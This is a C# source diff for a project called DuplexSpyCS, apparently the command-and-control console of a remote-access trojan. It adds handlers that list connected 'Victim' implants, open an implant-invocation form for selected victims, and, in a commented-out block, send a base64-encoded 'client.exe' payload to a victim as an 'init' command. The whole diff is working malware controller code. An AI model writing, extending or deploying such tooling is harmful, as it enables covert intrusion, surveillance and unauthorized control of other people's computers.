@@ -1341,6 +1341,48 @@ namespace DuplexSpyCS
             }
         }
 
+        private void fnImplantConnected(Listener l, Victim v, string[] aszMsg)
+        {
+            ListViewItem item = new ListViewItem(v.socket.RemoteEndPoint.ToString());
+            for (int i = 0; i < aszMsg.Length; i++)
+                item.SubItems.Add(aszMsg[i]);
+            item.Tag = v;
+
+            Invoke(new Action(() =>
+            {
+                if (listView2.FindItemWithText(aszMsg[0]) != null)
+                    return;
+
+                listView2.Items.Add(item);
+            }));
+
+            /*
+            string szClient = "client.exe";
+            if (!File.Exists(szClient))
+                return;
+
+            string szMainClient = C2.ini_manager.Read("[Implant]", "Payload");
+            if (string.IsNullOrEmpty(szMainClient))
+            {
+
+            }
+
+            v.SendCommand("init|" + Convert.ToBase64String(File.ReadAllBytes(szClient)));
+            */
+        }
+
+        private void fnImplantDisconnected(Victim v)
+        {
+            Invoke(new Action(() =>
+            {
+                ListViewItem item = listView2.FindItemWithText(v.socket.RemoteEndPoint.ToString());
+                if (item == null)
+                    return;
+
+                listView2.Items.Remove(item);
+            }));
+        }
+
         /// <summary>
         /// Get victim of listviewitem tag.
         /// </summary>
@@ -1438,6 +1480,9 @@ namespace DuplexSpyCS
             //listener.Received += Received; //Received event.
             listener.ReceivedDecoded += Received;
             listener.Disconencted += Disconnected; //Disconnected event.
+
+            listener.ImplantConnected += fnImplantConnected;
+            listener.Disconencted += fnImplantDisconnected;
 
             //Display remote desktop
             listView1.SmallImageList = il_screen; //Detail mode.
@@ -2040,6 +2085,21 @@ namespace DuplexSpyCS
         {
             frmTipoff f = new frmTipoff();
             f.Show();
+        }
+
+        private void toolStripMenuItem42_Click(object sender, EventArgs e)
+        {
+            List<Victim> lVictim = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (Victim)x.Tag).ToList();
+            if (lVictim.Count == 0)
+                return;
+
+            frmImplantInvoke f = new frmImplantInvoke(lVictim);
+            f.Show();
+        }
+
+        private void toolStripMenuItem43_Click(object sender, EventArgs e)
+        {
+
         }
     }
 }
